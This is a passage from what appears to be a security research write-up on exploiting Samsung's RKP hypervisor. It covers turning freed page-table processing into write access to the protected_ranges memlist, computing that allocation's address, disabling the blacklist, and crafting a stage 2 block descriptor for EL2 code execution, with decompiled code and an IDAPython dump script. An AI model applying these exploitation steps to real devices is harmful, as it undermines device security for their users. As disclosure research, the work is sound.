<p><code>rkp_l1pgt_free_pgd</code> calls <code>rkp_l1pgt_process_table</code>, that once again will process our "fake PGD" (<code>high_bits</code> is 0 but this time <code>is_alloc</code> is 0):</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_l1pgt_process_table</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">pgd</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">high_bits</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_phys_map_l1</span><span class="p">(</span><span class="n">pgd</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_phys_map_set</span><span class="p">(</span><span class="n">pgd</span><span class="p">,</span> <span class="n">FREE</span><span class="p">);</span>
    <span class="c1">// ...</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_s2_page_change_permission</span><span class="p">(</span><span class="n">pgd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// ...</span>
  <span class="p">}</span>
  <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">entry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">start_addr</span> <span class="o">=</span> <span class="n">high_bits</span> <span class="o">&lt;&lt;</span> <span class="mi">39</span><span class="p">;</span>
  <span class="c1">// ...</span>
  <span class="c1">// for each descriptor</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">desc</span><span class="p">)</span>
        <span class="n">set_pxn_bit_of_desc</span><span class="p">(</span><span class="n">desc_p</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">addr</span> <span class="o">=</span> <span class="n">start_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFF803FFFFFFF</span> <span class="o">|</span> <span class="n">offset</span><span class="p">;</span>
      <span class="n">res</span> <span class="o">+=</span> <span class="n">rkp_l2pgt_process_table</span><span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">is_alloc</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">start_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">39</span><span class="p">))</span>
        <span class="n">set_pxn_bit_of_desc</span><span class="p">(</span><span class="n">desc_p</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// ...</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">entry</span> <span class="o">!=</span> <span class="mh">0x1000</span><span class="p">);</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p><code>rkp_l1pgt_process_table</code> changes the type of the page in the <code>physmap</code> to <code>FREE</code>, sets the page as read-write, then calls <code>rkp_l2pgt_process_table</code> on our "fake PMD":</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_l2pgt_process_table</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">pmd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">pmd</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_phys_map_l2</span><span class="p">(</span><span class="n">pmd</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">table_addr</span> <span class="o">&gt;=</span> <span class="mh">0xFFFFFF8000000000</span><span class="p">)</span>
      <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"Never allow free kernel page table %lx"</span><span class="p">,</span> <span class="n">pmd</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_kernel</span><span class="p">(</span><span class="n">pmd</span><span class="p">))</span>
      <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"Entry must not point to kernel page table %lx"</span><span class="p">,</span> <span class="n">pmd</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_phys_map_set</span><span class="p">(</span><span class="n">pmd</span><span class="p">,</span> <span class="n">FREE</span><span class="p">);</span>
    <span class="c1">// ...</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_s2_page_change_permission</span><span class="p">(</span><span class="n">pmd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// ...</span>
  <span class="p">}</span>
  <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">|</span> <span class="n">start_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFC01FFFFF</span><span class="p">;</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="n">check_single_l2e</span><span class="p">(</span><span class="n">pmd</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">is_alloc</span><span class="p">);</span>
    <span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x200000</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p><code>rkp_l2pgt_process_table</code> changes the type of the page in the <code>physmap</code> to <code>FREE</code> and sets the page as read-write in the page tables. It calls <code>check_single_l2e</code> again, that will do the same thing as before.</p>
<h3 id="choosing-a-target-page">Choosing A Target Page<a class="headerlink" href="#choosing-a-target-page" title="Permanent link">¶</a></h3>
<p>Because <code>check_single_l2e</code> sets the PXN bit of the 
descriptors (the content of our target page) and further processes 
values that looks like a table descriptor, we cannot directly target 
RKP's code. Interesting targets that are writable from EL2 includes 
RKP's page tables (the stage 2 page tables for EL1 or the page tables 
for EL2). But by definition, they contain valid descriptors so they are 
very likely to make RKP or the kernel crash at some point as the result 
of this processing.</p>
<p>The target page that we chose is the one containing the memory backing the <code>protected_ranges</code>
 memlist. It contains values that are aligned on 8 bytes, so they look 
like invalid descriptors. And by nullifying this list, we are then able 
to provide addresses located inside the hypervisor memory region to all 
the command handlers.</p>
<p>This memlist is allocated in the <code>pa_restrict_init</code> function:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">pa_restrict_init</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">memlist_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">protected_ranges</span><span class="p">);</span>
  <span class="n">memlist_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">protected_ranges</span><span class="p">,</span> <span class="mh">0x87000000</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">);</span>
  <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

<p>To know where the memory backing this memlist will be allocated, we need to dig into <code>memlist_init</code>:</p>
<div id="memlist_init">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">memlist_init</span><span class="p">(</span><span class="n">memlist_t</span><span class="o">*</span> <span class="n">list</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">memlist_t</span><span class="p">));</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">memlist_reserve</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
  <span class="n">list</span><span class="o">-&gt;</span><span class="n">capacity</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
  <span class="n">list</span><span class="o">-&gt;</span><span class="n">merged</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">list</span><span class="o">-&gt;</span><span class="n">unkn_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">cs_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">cs</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p>The default capacity of memlists seems to be 5 entries. Since the <code>protected_ranges</code> memlist never contains more than 5 memory regions (even with the memory backing the <code>physmap</code> being added to it), it never gets reallocated so there's only ever one allocation. Let's see what <code>memlist_reserve</code> does:</p>
<div id="memlist_reserve">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">memlist_reserve</span><span class="p">(</span><span class="n">memlist_t</span><span class="o">*</span> <span class="n">list</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">list</span> <span class="o">||</span> <span class="o">!</span><span class="n">size</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="n">base</span> <span class="o">=</span> <span class="n">heap_alloc</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">*</span> <span class="n">size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">base</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x20</span> <span class="o">*</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">base</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="n">list</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">index</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">new_entry</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">base</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
      <span class="n">old_entry</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">base</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
      <span class="n">new_entry</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">=</span> <span class="n">old_entry</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">;</span>
      <span class="n">new_entry</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">old_entry</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
      <span class="n">new_entry</span><span class="o">-&gt;</span><span class="n">unkn_10</span> <span class="o">=</span> <span class="n">old_entry</span><span class="o">-&gt;</span><span class="n">unkn_10</span><span class="p">;</span>
      <span class="n">new_entry</span><span class="o">-&gt;</span><span class="n">extra</span> <span class="o">=</span> <span class="n">old_entry</span><span class="o">-&gt;</span><span class="n">extra</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">heap_free</span><span class="p">(</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">base</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">list</span><span class="o">-&gt;</span><span class="n">base</span> <span class="o">=</span> <span class="n">base</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p>The memory allocated (5 x 32 bytes) for backing the memlist comes 
from the "static heap" allocator. When this allocation is made, the 
"static region" is made of:</p>
<ul>
<li>the EL2 memory: <code>0x87000000-0x87200000</code>;</li>
<li>minus the log region: <code>0x87100000-0x87140000</code>;</li>
<li>minus the uH/RKP region: <code>0x87000000-0x87046000</code>;</li>
<li>minus the "bigdata" region: <code>0x870FF000-87100000</code>.</li>
</ul>
<p>So the address returned by the allocator should be somewhere after <code>0x87046000</code>
 (between the uH/RKP and "bigdata" regions). To know at which offset 
exactly it will be, we need to look at the allocations done before <code>pa_restrict_init</code>.</p>
<p>By carefully tracing the execution, we find 4 allocations, all in the functions below:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">uh_init</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">uh_base</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">uh_size</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">apps_init</span><span class="p">();</span>
  <span class="n">uh_init_bigdata</span><span class="p">();</span>
  <span class="n">uh_init_context</span><span class="p">();</span>
  <span class="n">memlist_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">uh_state</span><span class="p">.</span><span class="n">dynamic_regions</span><span class="p">);</span>
  <span class="n">pa_restrict_init</span><span class="p">();</span>
  <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kt">uint64_t</span> <span class="nf">apps_init</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">uh_handle_command</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">saved_regs</span><span class="p">);</span>
  <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">uh_handle_command</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">app_id</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">cmd_id</span><span class="p">,</span> <span class="n">saved_regs_t</span><span class="o">*</span> <span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="k">return</span> <span class="n">cmd_handler</span><span class="p">(</span><span class="n">regs</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_cmd_init</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">rkp_init_cmd_counts</span><span class="p">();</span>
  <span class="c1">// ..</span>
<span class="p">}</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kt">uint8_t</span><span class="o">*</span> <span class="nf">rkp_init_cmd_counts</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">malloc</span><span class="p">(</span><span class="mh">0x8A</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">uh_init_bigdata</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bigdata_state</span><span class="p">)</span>
    <span class="n">bigdata_state</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x230</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="mh">0x870FFC40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x3C0</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">bigdata_state</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x230</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">s1_map</span><span class="p">(</span><span class="mh">0x870FF000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">UNKN3</span> <span class="o">|</span> <span class="n">WRITE</span> <span class="o">|</span> <span class="n">READ</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span><span class="o">*</span> <span class="nf">uh_init_context</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">uh_context</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">uh_context</span><span class="p">)</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"RKP_1cae4f3b"</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="s">"%s RKP_148c665c"</span><span class="p">,</span> <span class="s">"uh_init_context"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">memset</span><span class="p">(</span><span class="n">uh_context</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<ul>
<li>The first allocation of size 0x8A happens in <code>rkp_init_cmd_counts</code>.</li>
<li>The second allocation of size 0x230 happens in <code>uh_init_bigdata</code>.</li>
<li>The third allocation of size 0x1000 happens in <code>uh_init_context</code>.</li>
<li>The fourth allocation of size 0xA0 comes from <code>memlist_init(&amp;dynamic_regions)</code>.</li>
</ul>
<p>Now we can calculate the offset. Each allocation has an header of 
0x18 bytes, and the allocator rounds up the total size to the next 
8-byte boundary. By doing the maths properly, we find the physical 
address where <code>protected_ranges</code> is allocated:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">f</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span>
<span class="o">&gt;&gt;&gt;</span> <span class="mh">0x87046000</span> <span class="o">+</span> <span class="n">f</span><span class="p">(</span><span class="mh">0x8A</span><span class="p">)</span> <span class="o">+</span> <span class="n">f</span><span class="p">(</span><span class="mh">0x230</span><span class="p">)</span> <span class="o">+</span> <span class="n">f</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">f</span><span class="p">(</span><span class="mh">0xA0</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x18</span>
<span class="mh">0x870473d8</span>
</code></pre></div>

<p>We also need to know what's in the same page as the <code>protected_ranges</code> memlist. It is preceded by the <code>uh_context</code> which is <code>memset</code> and only used on panics. And it is followed by a memlist reallocation coming from <code>init_cmd_add_dynamic_region</code>, and a page-aligned allocation of a stage 2 page table coming from <code>init_cmd_initialize_dynamic_heap</code>.
 This means that there should be no value looking like a page table 
descriptor in this page (at least there wasn't on our test device).</p>
<p>Now that we have made the page containing the <code>protected_ranges</code> memlist writable in the stage 2, we can directly modify it from the kernel. The goal is to have <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#check_kernel_input"><code>check_kernel_input</code></a> always return 0 so that we can give arbitrary addresses inside hypervisor memory to all the command handlers. <code>check_kernel_input</code> calls <code>protected_ranges_contains</code>, which itself calls <code>memlist_contains_addr</code>:</p>
<div id="memlist_contains_addr">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">memlist_contains_addr</span><span class="p">(</span><span class="n">memlist_t</span><span class="o">*</span> <span class="n">list</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">cs_enter</span><span class="p">(</span><span class="o">&amp;</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">cs</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="n">list</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">index</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">entry</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">base</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&gt;=</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">&amp;&amp;</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">+</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">cs_exit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">cs</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">cs_exit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">list</span><span class="o">-&gt;</span><span class="n">cs</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p>Since the first entry is the one spanning over the hypervisor memory, it looks like that by setting its <code>size</code> field (at offset 8) to zero, we will effectively disable the blacklist.</p>
<h3 id="getting-code-execution">Getting Code Execution<a class="headerlink" href="#getting-code-execution" title="Permanent link">¶</a></h3>
<p>The final step to fully compromise the hypervisor is to get arbitrary
 code execution. This can be achieved in multiple ways, but the simplest
 way is likely to manually modify the page tables of the stage 2 at EL1.</p>
<p>For example, we can target the level 2 descriptor that covers the 
memory range of the hypervisor and turn it into a writable block 
descriptor. The write itself can be performed by calling <code>rkp_cmd_write_pgt3</code> since we have disabled the <code>protected_ranges</code>
 memlist. We can dump the initial stage 2 page tables at EL1 using an 
IDAPython script to find the physical address of the target descriptor:</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">ida_bytes</span>

<span class="n">sizes</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x8000000000</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">parse_static_s2_page_tables</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">start_vaddr</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">sizes</span><span class="p">[</span><span class="n">level</span><span class="p">]</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">512</span><span class="p">):</span>
        <span class="n">desc_addr</span> <span class="o">=</span> <span class="n">table</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span>
        <span class="n">desc</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="o">.</span><span class="n">get_qword</span><span class="p">(</span><span class="n">desc_addr</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">continue</span>
        <span class="n">paddr</span> <span class="o">=</span> <span class="n">desc</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span>
        <span class="n">vaddr</span> <span class="o">=</span> <span class="n">start_vaddr</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="n">size</span>

        <span class="k">if</span> <span class="n">level</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="ow">and</span> <span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">"L</span><span class="si">%d</span><span class="s2"> Table for </span><span class="si">%016x</span><span class="s2">-</span><span class="si">%016x</span><span class="s2"> is at </span><span class="si">%08x</span><span class="s2">"</span> \
                  <span class="o">%</span> <span class="p">(</span><span class="n">level</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">vaddr</span><span class="p">,</span> <span class="n">vaddr</span> <span class="o">+</span> <span class="n">size</span><span class="p">,</span> <span class="n">paddr</span><span class="p">))</span>
            <span class="n">parse_static_s2_page_tables</span><span class="p">(</span><span class="n">paddr</span><span class="p">,</span> <span class="n">level</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">vaddr</span><span class="p">)</span>

<span class="n">parse_static_s2_page_tables</span><span class="p">(</span><span class="mh">0x87028000</span><span class="p">)</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code>L2 Table for 0000000000000000-0000000040000000 is at 87032000
L3 Table for 0000000002000000-0000000002200000 is at 87033000
L2 Table for 0000000080000000-00000000c0000000 is at 8702a000
L2 Table for 00000000c0000000-0000000100000000 is at 8702b000
L2 Table for 0000000880000000-00000008c0000000 is at 8702c000
L2 Table for 00000008c0000000-0000000900000000 is at 8702d000
L2 Table for 0000000900000000-0000000940000000 is at 8702e000
L2 Table for 0000000940000000-0000000980000000 is at 8702f000
L2 Table for 0000000980000000-00000009c0000000 is at 87030000
L2 Table for 00000009c0000000-0000000a00000000 is at 87031000
</code></pre></div>

<p>The L2 table mapping <code>0x80000000-0xc0000000</code> is at <code>0x8702a000</code>. We get the descriptor's address, which depends on the target address (<code>0x87000000</code>) and the L2 block size (<code>0x200000</code>), by adding an offset to the L2 table address:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x8702a000</span> <span class="o">+</span> <span class="p">((</span><span class="mh">0x87000000</span> <span class="o">-</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="o">//</span> <span class="mh">0x200000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
<span class="mh">0x8702a1c0</span>
</code></pre></div>

<p>The descriptor's value is made of the target address and its attributes: <code>0x87000000 | 0x4fd = 0x870004fd</code>.</p>
<div class="codehilite"><pre><span></span><code>0 1 00 11 1111 01 = 0x4fd
^ ^ ^  ^  ^    ^
| | |  |  |    `-- Type: block descriptor
| | |  |  `------- MemAttr[3:0]: NM, OWBC, IWBC
| | |  `---------- S2AP[1:0]: read/write
| | `------------- SH[1:0]: NS
| `--------------- AF: 1
`----------------- FnXS: 0
</code></pre></div>

<p>As mentioned above, we will do the write by calling <code>rkp_cmd_write_pgt3</code>. <code>rkp_cmd_write_pgt3</code> calls <code>rkp_l3pgt_write</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span><span class="o">*</span> <span class="nf">rkp_l3pgt_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptep</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">pte_val</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">ptep_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">ptep</span><span class="p">);</span>
  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">ptep_pa</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_l3</span><span class="p">(</span><span class="n">ptep_pa</span><span class="p">)</span> <span class="o">||</span> <span class="n">is_phys_map_free</span><span class="p">(</span><span class="n">ptep_pa</span><span class="p">))</span> <span class="p">{</span>
